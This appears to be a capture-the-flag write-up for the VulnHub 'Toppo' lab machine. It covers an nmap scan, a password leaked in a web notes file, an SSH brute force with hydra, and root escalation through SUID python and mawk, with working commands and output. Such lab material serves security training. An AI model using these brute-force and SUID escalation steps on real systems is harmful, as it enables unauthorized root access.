<https://www.vulnhub.com/entry/toppo-1,245/>


# Description

> The Machine isn't hard to own and don't require advanced exploitation .

# Keywords

suid python, suid mawk

# Scan

    $ sudo nmap -sT -A -Pn -n  -p- 172.16.16.130
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-13 16:47 CEST
    Nmap scan report for 172.16.16.130
    Host is up (0.00051s latency).
    Not shown: 65531 closed ports
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
    |   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
    |   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
    |_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
    80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
    |_http-server-header: Apache/2.4.10 (Debian)
    |_http-title: Clean Blog - Start Bootstrap Theme
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100024  1          35811/udp6  status
    |   100024  1          42644/udp   status
    |   100024  1          45331/tcp   status
    |_  100024  1          45897/tcp6  status
    45331/tcp open  status  1 (RPC #100024)
    MAC Address: 00:0C:29:87:3F:30 (VMware)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.51 ms 172.16.16.130

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 15.09 seconds


# Exploit

## Web service

    $ curl http://172.16.16.130/admin/notes.txt
    Note to myself :

    I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .

## SSH service

    └─$ hydra -L usernames.txt -p 12345ted123 -f -e nsr -o hydra.txt -t 4 ssh://172.16.16.130
    Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-13 17:18:33
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
    [DATA] attacking ssh://172.16.16.130:22/
    [22][ssh] host: 172.16.16.130   login: ted   password: 12345ted123
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-13 17:18:36


    └─$ ssh ted@172.16.16.130
    ted@172.16.16.130's password: 12345ted123

# Get root


## suid

    ted@Toppo:~$ find / -perm -u=s -type f 2>/dev/null
    /sbin/mount.nfs
    /usr/sbin/exim4
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/bin/gpasswd
    /usr/bin/newgrp
    /usr/bin/python2.7      <== HERE
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/mawk           <== HERE
    /usr/bin/chfn
    /usr/bin/procmail
    /usr/bin/passwd
    /bin/su
    /bin/umount
    /bin/mount



## python

    ted@Toppo:~$ cat asroot.py 
    import os
    os.setuid(0)
    os.setgid(0)
    os.system('/bin/bash')
    ted@Toppo:~$ python test.py 
    root@Toppo:~# id
    uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth),1000(ted)

## mawk

    ted@Toppo:~$ mawk 'BEGIN {system("/bin/bash -p")}'
    bash-4.3# id
    uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
    bash-4.3# whoami
    root

    ted@Toppo:~$ mawk 'BEGIN {system("./asroot-32")}'
    root@Toppo:~# id
    uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth),1000(ted)
